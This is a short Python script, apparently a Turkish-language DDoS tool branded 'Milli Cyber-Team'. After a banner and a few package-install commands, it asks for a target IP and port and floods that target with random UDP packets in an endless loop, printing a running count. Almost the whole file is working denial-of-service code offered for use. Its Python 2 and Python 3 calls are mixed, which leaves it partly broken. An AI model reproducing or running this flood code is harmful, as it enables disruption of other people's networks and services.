import os
import sys
import time
os.system("clear")
banner="""                                                            \33[38m
  ________________
< Milli Cyber-Team >
  ================
   \33[39m
"""
print (banner)
print ("""
[1]Ddos Araci M.S.T ozel
                         """)
islem=input("\33[36m""M.S.T >> ")
import socket
import random
import os

os.system("apt-get install figlet")
os.system("pkg install python && pkg install python2")

os.system("clear")

os.system("figlet M.S.T DDOS ")
banner="""
                >CODER BY DEATH69
"""
print(banner)

Hedef_ip=raw_input("Hedef ip: ")
Hedef_port=input("Hedef port: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
        sock.sendto(bytes,(Hedef_ip,Hedef_port))
        sayac=sayac+1
        print("Milli Cyber-Team Ddos atiliyor:%s"%(sayac))
